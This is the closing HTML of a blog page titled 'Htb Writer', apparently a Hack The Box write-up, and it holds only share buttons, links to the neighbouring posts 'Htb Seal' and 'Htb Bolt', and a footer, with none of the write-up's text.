+<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f;title=Htb%20Writer" target=_blank rel=noopener aria-label title="Share on xing">
+<div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="whatsapp://send?text=Htb%20Writer%20https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
+<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f&t=Htb%20Writer" target=_blank rel=noopener aria-label title="Share on hacker news">
+<div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://telegram.me/share/url?text=Htb%20Writer&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-writer%2f" target=_blank rel=noopener aria-label title="Share on telegram">
+<div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+</div>
+</div>
+</a>
+</div>
+<hr>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h></span>
+</div>
+<div class=pagination__buttons>
+<a href=https://0xade1.github.io/posts/2021/10/htb-seal/ class="button previous">
+<span class=button__icon>←</span>
+<span class=button__text>Htb Seal</span>
+</a>
+<a href=https://0xade1.github.io/posts/2021/10/htb-bolt/ class="button next">
+<span class=button__text>Htb Bolt</span>
+<span class=button__icon>→</span>
+</a>
+</div>
+</div>
+<hr>
+</main>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2022</span>
+<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Made with &#10084;</span>
+</div>
+</div>
+</footer>
+</div>
+<script type=text/javascript src=https://0xade1.github.io/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5+q9hMmUsWWGa7+YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE+kyEg=="></script>
+</body>
+</html>
